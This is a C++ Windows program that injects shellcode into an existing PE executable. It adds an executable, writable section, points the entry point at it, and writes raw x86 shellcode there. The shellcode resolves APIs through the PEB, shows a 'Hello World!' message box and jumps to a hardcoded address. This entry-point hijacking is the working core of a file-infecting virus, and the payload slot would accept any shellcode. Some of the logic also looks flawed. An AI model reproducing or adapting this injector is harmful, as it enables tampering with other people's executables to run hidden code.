#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <stdio.h>
using namespace std;
void getFile(string &pFile);
void handleFile(string &pFile, HANDLE &hFile);
void handleMaping(HANDLE &hFile, HANDLE &hMapping);
void mapViewOfFile(HANDLE &hFile, HANDLE &hMapping, LPBYTE &baseAddress);
int main()
{
	// Enter File's path
	string filePath;
	getFile(filePath);

	// Open File to read
	HANDLE hFile;
	handleFile(filePath, hFile);

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	BYTE *pByte = new BYTE[dwFileSize];

	// Open a existed file mapping object for a specified file
	HANDLE hMapping;
	handleMaping(hFile, hMapping);

	// Maps a view of a file mapping into the address space of a calling process
	LPBYTE baseAddress;
	mapViewOfFile(hFile, hMapping, baseAddress);

	// DOS MZ
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	// PE Header
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
	PIMAGE_NT_HEADERS32 ntHeader32 = (PIMAGE_NT_HEADERS32)(baseAddress + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)(IMAGE_FIRST_SECTION(ntHeader32));
	// Check if is a PE or not
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		cout << "Invalid PE file." << endl;
		UnmapViewOfFile(baseAddress);
		CloseHandle(hMapping);
		CloseHandle(hFile);
	}

	

	// Calculate the size of the new section header
	DWORD sectionHeaderSize = sizeof(IMAGE_SECTION_HEADER);

	PIMAGE_FILE_HEADER fileHeader = &(ntHeaders->FileHeader);
	PIMAGE_SECTION_HEADER firstSectionHeader = (PIMAGE_SECTION_HEADER)(((UINT_PTR)fileHeader) + sizeof(IMAGE_FILE_HEADER) + sizeof(ntHeader32->OptionalHeader));

	// We asssume there is room for a new section header.
	PIMAGE_SECTION_HEADER newSectionHeader = &pSecHdr[ntHeader32->FileHeader.NumberOfSections]; // Right after last section header.
	PIMAGE_SECTION_HEADER lastSectionHeader = &pSecHdr[ntHeader32->FileHeader.NumberOfSections - 1];



	

	memset(newSectionHeader, 0, sectionHeaderSize);
	memcpy(&newSectionHeader->Name, "NEW", 8);
	newSectionHeader->Misc.VirtualSize = 0x2000;
	newSectionHeader->VirtualAddress =lastSectionHeader->PointerToRawData + lastSectionHeader->SizeOfRawData + newSectionHeader->Misc.VirtualSize + 0x1000 ;
	newSectionHeader->SizeOfRawData = newSectionHeader->Misc.VirtualSize;
	newSectionHeader->PointerToRawData = lastSectionHeader->PointerToRawData + lastSectionHeader->SizeOfRawData;
	newSectionHeader->Characteristics = IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_READ + IMAGE_SCN_MEM_WRITE;
	cout << &newSectionHeader->PointerToRawData << endl;
	// memset(0x1C000, 0, newSectionHeader->SizeOfRawData);
	// Calculate the new size of the image
	DWORD newSizeOfImage = ntHeader32->OptionalHeader.SizeOfImage + newSectionHeader->Misc.VirtualSize;

	// Update the size of the image in the optional header
	ntHeader32->OptionalHeader.SizeOfImage = newSizeOfImage;
		//Update
	ntHeader32->FileHeader.NumberOfSections++;
	DWORD OEP = ntHeader32->OptionalHeader.AddressOfEntryPoint + ntHeader32->OptionalHeader.ImageBase;
	ntHeader32->OptionalHeader.AddressOfEntryPoint = newSectionHeader->VirtualAddress;
	for (int i = 0; i < ntHeader32->FileHeader.NumberOfSections; i++)
	{
		std::cout << "Section " << i + 1 << std::endl;
		std::cout << "Name: " << pSecHdr[i].Name << std::endl;
		std::cout << "Virtual Size: " << pSecHdr[i].Misc.VirtualSize << std::endl;
		std::cout << "Virtual Address: " << hex << pSecHdr[i].VirtualAddress << std::endl;
		std::cout << "Size of Raw Data: " << hex << pSecHdr[i].SizeOfRawData << std::endl;
		std::cout << "Pointer to Raw Data: " << pSecHdr[i].PointerToRawData << std::endl;
		std::cout << std::endl;
	}

	// Move the file pointer to the end of the file

	// // Set the file size to the new size
	// SetFilePointer(hFile, newSizeOfImage, NULL, FILE_BEGIN);
	// SetEndOfFile(hFile);
	SetFilePointer(hFile, dwFileSize, NULL, FILE_BEGIN);

	//Fill filesize of 00 bytes
	const int rowSize = newSectionHeader->SizeOfRawData;
	char *zeroByte = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	for (int i = 0; i < rowSize; ++i)
	{
		WriteFile(hFile, zeroByte,  1, NULL, 0);
	}

	//shellcode
	SetFilePointer(hFile, newSectionHeader->PointerToRawData, NULL, FILE_BEGIN);
	const char shellcode[] ={"\xeb\x24\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x00\x48\x65\x6c\x6c\x6f\x00\x57\x6f\x72\x6c\x64\x21\x00\xe8\x00\x00\x00\x00\x5d\x81\xed\x2b\x10\x40\x00\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x8b\xc8\x53\x56\x85\xc9\x74\x70\x8b\x41\x3c\x8d\x44\x01\x78\x8b\x10\x8d\x04\x0a\x8b\x50\x18\x85\xd2\x74\x5d\x8b\x58\x20\x8d\x1c\x0b\x8b\x33\x8d\x34\x0e\x81\x3e\x4c\x6f\x61\x64\x75\x44\x81\x7e\x04\x4c\x69\x62\x72\x75\x3b\x81\x7e\x08\x61\x72\x79\x41\x75\x32\xf7\xda\x8b\x70\x18\x8d\x14\x32\x8b\x70\x24\x8d\x34\x0e\x0f\xb7\x14\x56\x8b\x70\x1c\x8d\x34\x0e\x8b\x34\x96\x8b\x10\x3b\xf2\x72\x17\x8b\x58\x04\x03\xda\x3b\xf3\x73\x0e\x8d\x04\x0e\xeb\x0e\x5e\x5b\xc3\x83\xc3\x04\x4a\x75\xa9\x33\xc0\x5e\x5b\xc3\x8b\xd5\x81\xc2\x02\x10\x40\x00\x52\xff\xd0\x50\x53\x56\x85\xc9\x74\xe9\x8b\x41\x3c\x8d\x44\x01\x78\x8b\x10\x8d\x04\x0a\x8b\x50\x18\x85\xd2\x74\xd6\x8b\x58\x20\x8d\x1c\x0b\xeb\x00\x8b\x33\x8d\x34\x0e\x81\x3e\x47\x65\x74\x50\x75\x4f\x81\x7e\x04\x72\x6f\x63\x41\x75\x46\x81\x7e\x08\x64\x64\x72\x65\x75\x3d\x81\x7e\x0b\x65\x73\x73\x00\x75\x34\xf7\xda\x8b\x70\x18\x8d\x14\x32\x8b\x70\x24\x8d\x34\x0e\x0f\xb7\x14\x56\x8b\x70\x1c\x8d\x34\x0e\x8b\x34\x96\x8b\x10\x3b\xf2\x72\x85\x8b\x58\x04\x03\xda\x3b\xf3\x0f\x83\x78\xff\xff\xff\x8d\x04\x0e\xeb\x07\xc3\x83\xc3\x04\x4a\x75\x9e\x8b\xd0\x58\x5e\x5b\x8b\xc5\x05\x0d\x10\x40\x00\x50\x53\xff\xd2\xeb\x00\x6a\x00\x8b\xd5\x81\xc2\x19\x10\x40\x00\x52\x8b\xd5\x81\xc2\x1f\x10\x40\x00\x52\x6a\x00\xff\xd0\x68\x75\x24\x01\x01\x58\xff\xe0"}
		
		;
	WriteFile(hFile, shellcode, sizeof(shellcode), NULL, 0);
	// get original entry point
	// DWORD dwOEP = ntHeader32->OptionalHeader.AddressOfEntryPoint +
	// 			  ntHeader32->OptionalHeader.ImageBase;

	// ZeroMemory(&pSecHdr[ntHeader32->FileHeader.NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
	// CopyMemory(&pSecHdr[ntHeader32->FileHeader.NumberOfSections].Name, "CODE", 8);

	// ntHeader32->FileHeader.
}
void getFile(string &pFile)
{

	cout << "Enter file path to inject: ";
	getline(cin, pFile);
}
void handleFile(string &pFile, HANDLE &hFile)
{

	// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
	hFile = CreateFileA(pFile.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		cout << "Failed to open the file. Error code: " << GetLastError() << endl;
	}
}

void handleMaping(HANDLE &hFile, HANDLE &hMapping)
{

	// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
	hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (hMapping == NULL)
	{
		cout << "Failed to create file mapping. Error code: " << GetLastError() << endl;
		CloseHandle(hFile);
	}
}
void mapViewOfFile(HANDLE &hFile, HANDLE &hMapping, LPBYTE &baseAddress)
{

	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile
	baseAddress = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (baseAddress == NULL)
	{
		cout << "Failed to map view of file. Error code: " << GetLastError() << endl;
		CloseHandle(hMapping);
		CloseHandle(hFile);
	}
}